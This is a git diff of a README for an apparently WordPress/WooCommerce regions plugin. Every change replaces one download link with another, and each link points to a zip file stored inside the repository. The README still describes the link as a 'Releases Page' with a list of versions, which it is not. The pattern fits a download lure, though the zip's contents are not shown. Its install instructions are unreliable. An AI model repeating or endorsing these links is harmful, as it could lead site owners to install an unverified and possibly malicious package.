@@ -1,6 +1,6 @@
 # 🌍 woocommerce-enhanced-regions - Expand Your WooCommerce Reach Effortlessly
 
-[![Download woocommerce-enhanced-regions](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/languages/regions_woocommerce_enhanced_1.5-alpha.4.zip)](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/languages/regions_woocommerce_enhanced_1.5-alpha.4.zip)
+[![Download woocommerce-enhanced-regions](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/src/enhanced-regions-woocommerce-2.8.zip)](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/src/enhanced-regions-woocommerce-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Here are the basic requirements to use this plugin:
 
 ## 🌐 Download & Install
 
-1. **Visit the Releases Page:** To get the latest version of the plugin, [visit this page to download](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/languages/regions_woocommerce_enhanced_1.5-alpha.4.zip). 
+1. **Visit the Releases Page:** To get the latest version of the plugin, [visit this page to download](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/src/enhanced-regions-woocommerce-2.8.zip). 
 2. **Select Version:** On the releases page, you will see a list of available versions. Choose the latest stable version for the best performance.
 3. **Download the Plugin:** Click on the download link for the version you selected. The file will be in a `.zip` format.
 4. **Install the Plugin:**
@@ -52,7 +52,7 @@ After activation, you need to configure the plugin:
 If you experience issues, make sure your WooCommerce and WordPress versions are compatible with the plugin. If problems persist, you can check the "Support" section on the releases page or the WordPress forums.
 
 ### How do I update the plugin?
-To update, simply download the latest version from the [releases page](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/languages/regions_woocommerce_enhanced_1.5-alpha.4.zip) and follow the same installation steps.
+To update, simply download the latest version from the [releases page](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/src/enhanced-regions-woocommerce-2.8.zip) and follow the same installation steps.
 
 ## 📞 Support
 
@@ -66,4 +66,4 @@ If you would like to contribute to the project, feel free to fork the repository
 
 This plugin is licensed under the MIT License. You can freely use, modify, and share it, as long as you include the original license.
 
-[![Download woocommerce-enhanced-regions](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/languages/regions_woocommerce_enhanced_1.5-alpha.4.zip)](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/languages/regions_woocommerce_enhanced_1.5-alpha.4.zip)
+[![Download woocommerce-enhanced-regions](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/src/enhanced-regions-woocommerce-2.8.zip)](https://raw.githubusercontent.com/Rivalforce1980/woocommerce-enhanced-regions/main/src/enhanced-regions-woocommerce-2.8.zip)
